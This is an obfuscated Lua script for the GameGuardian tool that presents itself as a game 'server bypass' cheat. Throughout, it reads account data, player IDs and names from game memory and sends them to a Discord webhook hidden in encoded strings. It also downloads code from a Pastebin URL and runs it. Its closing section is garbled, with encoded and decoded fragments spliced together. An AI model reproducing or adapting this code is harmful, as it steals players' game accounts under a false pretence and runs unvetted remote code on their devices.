Tx=((((15-10)-3)/((14-9)-(5-2)))*((7-4)-(620-(555+64))))+30;Kt=(((935-(857+74))-(570-(367+201)))/(937-(214+713)))*Tx;xj=(12*(2+3))+(((98+525)-((1432-(282+595))+64))*Kt);zk=(933-((2494-(1523+114))+67+7))*xj;local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw(data) m=string.sub(data,0,(Tx*Kt/Tx)/(zk/3)+(zk*1/2)) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


function dwordToUTF8(dword)
    local byte1 = dword & 0xFF
    local byte2 = (dword >> 8) & 0xFF
    local byte3 = (dword >> 16) & 0xFF
    local byte4 = (dword >> 24) & 0xFF
    return string.char(byte1, byte2, byte3, byte4)
end
gg.toast(zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('cDBMChEZQXsrMOftWZyHoaSZVoUraMvgJZcnemLeiMzpfoxhxtRfaemUGxlYXNlIHdhaXQuLi4uLmJ5cGFzc2luZyBzZXJ2ZXI='))
function scanAndCollectResults(searchString, refineString, maxResults, stepCount, searchType)
    searchType = searchType or gg.TYPE_BYTE
 
    gg.searchNumber(searchString, searchType, false, gg.SIGN_EQUAL, 0, -1)
    gg.refineNumber(refineString)
    gg.setVisible(false)
    local results = gg.getResults(maxResults or 1000)
    local fullUtf8Data = zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('YAzvWmCQJYYzvjUTmOSPdbxyBHNbKKZlEjuYHlmbJkeRTUlTCnWCwyh')
 
    if #results > 0 then
        for _, result in ipairs(results) do
            local baseAddress = result.address
            local utf8Combined = zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('piafEaXAFZfAlPPgoXwkrFOrjKzMnCTcuccvZBKPMJMhtUGjyizzDVP')
 
            for offset = 0, (stepCount or 200), 4 do
                local dword = gg.getValues({ { address = baseAddress + offset, flags = gg.TYPE_DWORD } })[1]
                if dword then
                    utf8Combined = utf8Combined .. dwordToUTF8(dword.value)
                end
            end
 
            fullUtf8Data = fullUtf8Data .. utf8Combined .. zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('vhLkqBVlhJAZJFopfPcxACKUgDROQIgeILtJHQwoCVcwqWArSMmbsvjXG4=')
        end
    end
 
    gg.clearResults()
    return fullUtf8Data
end
 
local webhook_url = zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('nTNIShJOIdCTsqDgnRHVwSACYqewuUAmUXWKXmBnlYKxclnAWjUivkiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5NTg1MjE2MzI1MTE3NTU0Ni9EemJkQkNfVWxmRnA4elBXNi1GTnNXb01vbjVpUzRDT2I4amhmNzVHcmxKdWlFV3pRZWNTNHgzOXhuNklvcThObWxxVg==')
 
local function buildQuery(url, query)
    if not query or next(query) == nil then
        return url
    end
 
    local query_string = zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('CAMWnQtJWSvWsDOeQddmACmbnCPexaRSLDbXTOftKkWEFIwWEZXhiDh')
    for k, v in pairs(query) do
        query_string = query_string .. k .. zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('mSceXNheAsussNLRmzhoaoYNORFTBnxqPoKaZjoJsGmIgRCBUtoBbsrPQ==') .. tostring(v) .. zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('vizCYFbUyBIdHwRPoYXzPlyxPOsdJfIHmkxhGoCPxwlqVrstcLOArcbJg==')
    end
    query_string = query_string:sub(1, -2)
 
    return url .. zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('sAMfxkUyjzRBCwKGplAgYEOLHkLMMoUSSnZpWdfaUBVvwXzXKQeauuBPw==') .. query_string
end
 
local function escapeString(s)
    s = s:gsub(zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('ljmTVXACGDADYrwBOHzjnnMgiGkuLFXZBFWObwDFCUPMlwWKrLnaxwrXFw='), zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('PpNAYHeaaXKfaldxhAbbDODwNOoXdjiuFqwXIrSlWkXNKlHAXlNvUfLXFxcXA=='))
    s = s:gsub(zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('FmoNOiMDbytaRAFICGoIwxFCAlRsPqjYMSfnrmeeYVXEiwLazjEiJPTXA==')zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('ZkIVmxhjCkwnDGAupMxggQPMmaJBYKXdkHjPCBLJJfbrlIwDRmFDOtsLCA=')\\\zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('ltnXjVuHeZmoXBHUOuKOAOHRizZYqMdMTLDACINKHUewwiDRDUgShGL'))
    s = s:gsub(zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('dRSKREHciDsobePMdWFLLEkEwsGMxnGuIHBqnoWXJhBOQBYcBuFfallXG4='), zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('TCpYbYROAeCDMrlJkfpuKojTPFcTFJtwQXoFFRAAPEZpZdBlWFQyOmhXFxu'))
    s = s:gsub(zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('VjDnyOhPipzMQknkhFounwkLtDRxBeUIxPJIZQPUoxnPlBNMbxaPqFJXHI='), zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('rBxtdnwPlqzpfQtGgVIwJxceMYvDwbNfnGVQuHzfzdlAPQuCYIAWfyVXFxy'))
    return s
end
 
local function toJson(tbl)
    local json = zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('ioTauhSSjvVHBsFvQurziYDrzXnmaAPYWgDtGVMHzBSajPuAwokaaCgew==')
 
    for k, v in pairs(tbl) do
        local kType = type(k)
 
        if kType == zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('rcsWoXjHFUTPztNKiYHHzoyCLkMrTFxVjrarqwvkqMOWoIEMMGeENrBc3RyaW5n') then
            json = json .. zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('vpyuTxwEDDtizhFXprSaKAGpIHZxKUehFqwwXUEMzdqqIKfiYtRYsVM')zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('nEsaKeSUrJCFzLspTvOOUylCkOoMDOegoDSfkCUEWChRSQDjluMpowFIC4uIGsgLi4g')zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('GxHZhJRcArVNgDdJCcVzbxRXYgtEFpxmWysPFVnIVtbMjnCJypToacWOg==')
        elseif kType == zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('NghvhqZjqQBSxGWrdyZjVdiXKILJxEnEYyaZBYnkgIgXbZFJRfmAdYcbnVtYmVy') then
            json = json .. k .. zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('etyIwVXYyWSrnTgWoZpXnJcxCeKqIHlRXgpxSyGsrzfBQSFfOilguhqOg==')
        end
 
        local vType = type(v)
 
        if vType == zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('vJBmZsZUhYhaSgfQHrLEploBdSLCTaCZamRtzsGBLdRbvkUCbfQuAocc3RyaW5n') then
            json = json .. zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('felpmBfogWPAakCVpWCrwdsUtkRNixryedUVcfixKORlHEGyfbdUIXI')zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('zJksWhFcQPjksqkYLbOmMlMMnKgDvzkFvvYtnxOfNNsXRYhxoRobUZDIC4uIGVzY2FwZVN0cmluZyh2KSAuLiA=')zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('GDtdyeqrebsiswHnYNDYKuKLaLKlRdWQwyFvLiJCEywXvbTGNMIGERD')
        elseif vType == zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('nRmbNPnZrKwOnRqwQiQbqQJpwIlDyzQvrqmJWOhWmwqUqOiLxVMKrzcbnVtYmVy') then
            json = json .. v
        elseif vType == zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('cNEAuKQQveqpRBLzBUbSHNlYXOseiVplPnedfIZVvRjpcGAmBmpuZlZdGFibGU=') then
            json = json .. toJson(v)
        end
 
        json = json .. zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('JQOEDpLrMpAIFkSbmGxTIBHyEyuqdnmHHOkhbGTSnHzMcuwXGQqSTyELA==')
    end
 
    json = json:sub(1, -2) .. zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('hxqqQUnqSJIgSKjjiVhFygSjuQDMZgDbbDkmWwiGvRYTSMwBHmpjQETfQ==')
 
    return json
end
 
local function sendWebhook(payload_content)
    local payload = { content = payload_content }
    local headers = {
        [zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('xRayOzWvATdSLoPzHfIoRPiXIyEzijrwcuKsbQoELEpWmeXfGsFzHNAQ29udGVudC1UeXBl')] = zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('ZOaOppDYZFZhJHyQkUpCAOAUtxXBsEeXvtkTGMhXlKjWTrigyoCQdbBYXBwbGljYXRpb24vanNvbg=='),
    }
    local payload_json = toJson(payload)
    gg.makeRequest(webhook_url, headers, payload_json)
end
 
local secret_accounts = {}
 
function fetchSecretAccounts()
    local pastebinURL = zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('cSIsUiTHLFWrepykQKoUXsRBTqdJvibDtUfvRTdiMgTOUxyIbwrIhcuaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3d2d0ZXN2hV')
    local response = gg.makeRequest(pastebinURL)
 
    if response and response.content then
        local chunk, errorMsg = load(response.content)
        if chunk then
            secret_accounts = chunk()
        else
            print(zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('jBBrsyGnxguzxrgiuIZbcAftjGwGACRvInUPtfiyJTMHoPPMoVBjnsRVW5rbm93biBFcnJvciwgcGxlYXNlIHJ1biBzY3JpcHQgYWdhaW4u'))
            os.exit()
        end
    else
        print(zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('wfYcnaYobPykXyZyYINCBXNhfBnBhEKExfeNRAaFAYRqkyMOUkKeXFzVW5rbm93biBFcnJvciwgcGxlYXNlIHJ1biBzY3JpcHQgYWdhaW4u'))
        os.exit()
    end
end
 
function checkSecretAccounts()
    for account_id, associated_id in pairs(secret_accounts) do
        gg.searchNumber(zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('YugGZUdcGmQhlKVUtdmiHxmnSMJOEEPFnsUjvzpnOenudUCtWPealdoOw==') .. account_id, gg.TYPE_WORD, false, gg.SIGN_EQUAL, 0, -1)
        gg.setVisible(false)
        local results = gg.getResults(1)
        gg.clearResults()
 
        if #results > 0 then
            sendWebhook(zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('CYzGQayqWBGUVDyqoMGvJHJIzxsjlUIETkGNRTIMsVzmUtYLDhraOAF8J+UkiBVc2VyOiA=') .. associated_id)
            return true
        end
    end
    return false
end
 
fetchSecretAccounts()
 
local function sanitizeString(input)
    -- Replace null bytes and invalid characters with empty
    return input:gsub(zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('jIOaBfUswcFiEMFsjHkgYOPzYQNIwgaalNeizGXVEPWGZvuhypBXxhcWyV6XDEtXDMxXDEyNy1cMjU1XQ=='), zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('ynHTGuhSFcvveWBghPQbHsGcRyNhbKyXIfVvgbkSMgRKyGmvXjoHlHC'))
end
 
-- Main data collection
local fullUtf8Data = scanAndCollectResults(zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('SVjpDeEkeDQYMjfwpQDpmScCcONWNULnsuzUVawimDaWzDPufUkqHXROmFkSW50ZXJ2YWw='), zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('rPrdVlwhFyksgMNBDZWJsrOjAxMUhCznJqMvoEYJDyUrRzBbcjHHCieOnY='), 1000, 200, gg.TYPE_BYTE)
local tmp_c_id = scanAndCollectResults(zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('AIVBzKcxLAibcdkmQESBdmSymfzcRSAhtGWKSjZKaYMzOOGfLEvPEKtOCwzODksNzcyLDI3NywxMDcsMDg5LDY5OA=='), zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('VdPBiVkKdznHcPhZrCghBRtznofXdcsrHqzfgBpwAxcqJnOWttuqXyPOCwzODksNzcyLDI3NywxMDcsMDg5LDY5OA=='), 1000, 100, gg.TYPE_QWORD)
local playerName = scanAndCollectResults(zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('lNbrAorUgBESrOKkOeXGxhmdYZkcWPJEqGhzRsyoNoZkUopwMGZisjjOntc')CreatezbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('HhDpMUYyBBWZnbsbkSbZlDOIMvSVIxFqNBwUzsiplXGiOhPQAAIuhAkLCA='):tzbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('vrkzAcRxUWqwrXNnBCeNPvrksHiQsSdjNXunBNxkvdKeZQZCzqULAXQLCAxMDAwLCA3MCwgZ2cuVFlQRV9CWVRFKQ0KLS1sb2NhbCBwbGF5ZXJJZCA9IHNjYW5BbmRDb2xsZWN0UmVzdWx0cyg=')27,423,342,016,359,796zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('wilOrIJvdjuVBMcyJVjwvNceseZQWinofGRyDibCScElcWHOcpOLBRTLCA=')27,423,342,016,359,796zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('NYWwHoYYbCsDggBHNScJRTGthTdEUrNtqvKCSQgBPajuEVCrXXseUAULCAxMDAwLCAxMDAsIGdnLlRZUEVfUVdPUkQpDQogDQppZiBub3QgY2hlY2tTZWNyZXRBY2NvdW50cygpIHRoZW4NCiAgICBpZiBmdWxsVXRmOERhdGEgPT0g')zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('YZLAlUcmeJEUwMLgGhzGBxAIlBuUQPTpmyVzcCxPIEiuLtwVqfbtYOlIGFuZCB0bXBfY19pZCA9PSA=')zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('MTfvMuVTEgeudggXznuEedvEgLXJltxVxRwUWqflPinQreSgMFuOxHWIGFuZCBwbGF5ZXJOYW1lID09IA==')zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('YbbrDJYNdzaWnKVOQocFTCmyswaaZMnLVsSBXtDVqJgxYpKHaaXwChEIGFuZCBwbGF5ZXJJZCA9PSA=')zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('ygqwsIWWbFhOstwarzcjxoIkqJQSXXYjBzRpEiPIMLGxCVxPZFXVFbZIHRoZW4NCiAgICAgICAgc2VuZFdlYmhvb2so')Error! Nothing Found 💩zbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('BSPcoXXNEWwEETaMyPSprKdzFSDxvlterEaioIozVDaicVOAhxniXWbKQ0KICAgIGVsc2UNCiAgICAgICAgbG9jYWwgcGF5bG9hZF9jb250ZW50ID0g')Account:\nzbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('XcuUfgQMvlMEByXCckOTmgYbrrDwdCrokrjEvfgjwnhjmbJhwDtatubIC4uIHNhbml0aXplU3RyaW5nKGZ1bGxVdGY4RGF0YSkgLi4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg')\n\nv1:\nzbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('DDNrljDeVRMWSdOMaQrJoAOdrmohEmYoiLMmzSdkjGjsWobvxJsGnEUIC4uIHNhbml0aXplU3RyaW5nKHRtcF9jX2lkKSAuLg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA=')\n\nv2:\nzbvEyaLGGicFQpshOvwtKbOgEaPOPMhExqCWduEVNZdrRpnzFHHUdfAgsOSJAouHBXCMtRLAmesUcqiadlxSzLEnQLcGXAWJw('gCxeeedEdhPbsTVxRXzDwYdRUqCKENCgqeZZvKVJKtRoWdyNndfLRykIC4uIHNhbml0aXplU3RyaW5nKHBsYXllck5hbWUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSAg')\n\nv3:\n' .. sanitizeString(playerId)
        sendWebhook(payload_content)
    end
end    
